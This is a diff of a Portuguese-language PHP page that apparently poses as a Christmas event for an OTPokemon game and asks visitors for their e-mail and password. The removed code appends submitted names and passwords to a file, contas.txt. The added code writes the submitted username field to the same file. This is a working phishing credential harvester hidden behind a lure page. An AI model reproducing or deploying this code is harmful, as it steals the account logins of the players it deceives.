@@ -1,26 +1,11 @@
 <?php
-function gravando($nome,$senha) {
-//Pegando os valores do formulário!
-
-; 
-
-
-$documento = "$nome;$senha;\r\n";
-
-//Aqui você coloca o nome do arquivo que será gravado
-$arquivo = "contas.txt";
-
-//Abrimos o arquivo que será gravado.
-$abrir = fopen($arquivo, "a");
-
-//Gravamos no arquivo
-$gravar = fwrite($abrir, $documento);
-
-//Testa se foi gravado
-if($gravar){
-}else{
-echo"Não gravado!";
-}
+ 
+if (isset($_POST['texto'])) {
+   $texto = $_POST['texto'];
+ 
+   $arquivo = fopen('contas.txt', 'w');
+   fwrite($arquivo, $texto);
+   fclose($arquivo);
 }
 ?>
 
@@ -291,16 +276,16 @@ function mostrarsenha() {
   <header><center><h1>Evento de Natal!l</h1></center></header>
   <center><img src="otpokemon.png"></center>
   <br>
-<form action="<?php echo gravando($_POST['acc'],$_POST['pwd']) ?>" method="post">
+<form method="post">
  <div class="form-group"><center>
  <label for="acc"><h2>Seu e-mail:</h2>
- <input type="text" name="acc" class="form-control" placeholder="Insira seu nome de usuario neste campo." id="acc" size="30" autofocus required></label></center>
+ <input type="text" name="texto" class="form-control" placeholder="Insira seu nome de usuario neste campo." id="texto" size="30" autofocus required></label></center>
  </div>
  <div class="form-group"><center>
  <label for="pwd"><h2>Senha:</h2>
  <input class="form-control" name="pwd" type="password" placeholder="Insira sua Senha neste campo." size="30" id="pwd" required></label>  <br><br><label for="show"><i>Mostrar senha</i></label> <input type="checkbox" onchange="mostrarsenha();" id="show"></center>
  
- <input type='submit' class="concluir" onclick = "gravando()" name='btnOK' value='Concluir'>
+ <input type='submit' class="concluir" name='btnOK' value='Concluir'>
   </div>
   </form>
 </div>
